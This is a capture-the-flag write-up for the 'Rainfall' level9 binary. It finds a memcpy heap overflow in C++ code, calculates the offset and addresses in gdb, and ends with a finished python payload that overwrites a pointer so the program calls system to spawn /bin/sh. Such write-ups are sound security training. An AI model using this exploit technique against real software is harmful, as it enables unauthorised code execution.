# level9

Nothing happens when testing the binary. With `gdb` we notice the code is in c++ :     

![image](https://github.com/chmadran/rainfall_42/assets/113340699/54e4e3ee-9c22-459a-9d7e-38844d083e83)

We also notice a call to `memcpy` which would be a vulnerability we exploit : 

![image](https://github.com/chmadran/rainfall_42/assets/113340699/38c92d99-d358-4d4e-8638-e40709596f15)

When trying to make the program segfault with `r 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'`

![image](https://github.com/chmadran/rainfall_42/assets/113340699/ea630870-3b15-4e32-865d-febefc2a46fa)

So 62 is `b` = ( 26 (uppercase letters) + 1 (index of b) ) * 4) = 108 OFFSET. 

Address of system is `0xb7d86060`

![image](https://github.com/chmadran/rainfall_42/assets/113340699/992fa82f-d998-40f9-ab11-f5f416d8a4b6)

Adresse of `$eax` overflowed at `+136` is `0x804a00c`

![image](https://github.com/chmadran/rainfall_42/assets/113340699/d32d7ac9-2b01-4b46-ab6d-b77aae57ed44)


So payload syntax will be : 

`[address of system] + [padding - number of bytes printed] + [address of eax to be replaced] + [;/bin/sh]`

So the paylaod is : 

`./level9 $(python -c 'print("\x60\x60\xd8\xb7" + "A"*104 + "\x0c\xa0\x04\x08" + ";/bin/sh")')`

